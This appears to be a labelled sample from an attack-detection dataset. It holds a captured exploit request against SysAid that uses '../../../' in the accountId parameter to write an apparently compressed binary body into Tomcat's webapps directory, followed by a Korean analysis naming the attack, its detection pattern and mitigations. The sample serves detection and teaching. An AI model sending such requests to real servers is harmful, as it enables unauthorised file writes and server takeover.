# SysAid_Path_Traversal_Attempt
SysAid_Path_Traversal_Attempt
POST /userentry?accountId=/../../../tomcat/webapps/qg6cP/&symbolName=test&base64UserName=YWRtaW4= HTTP/1.1
Host: 172.16.1.30
User-Agent: Mozilla/5.0 (Windows NT 10.0: Win64: x64: rv:126.0) Gecko/20100101 Firefox/126.0
Connection: close
Content-Length: 124
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

x...ff.b......"AQ.N ....d...\u....uM..L..J*JBC8.......c.K-..f`d......2..:>.58.+...I.....`q.&.-.Pm...B,A. ...
...!.H..M..
?..- 공격 이름: `Directory Traversal`
- 판단 근거: 페이로드에 `../../../` 패턴이 포함되어 있습니다.
- 탐지 패턴: `../../../`
- 설명: `Directory Traversal`은 공격자가 서버의 파일 시스템을 탐색하여 민감한 파일에 접근할 수 있도록 하는 공격입니다.
- 대응 방법: 입력값에서 `../`와 같은 패턴을 필터링하고, 웹 애플리케이션의 파일 접근 권한을 엄격히 설정합니다.
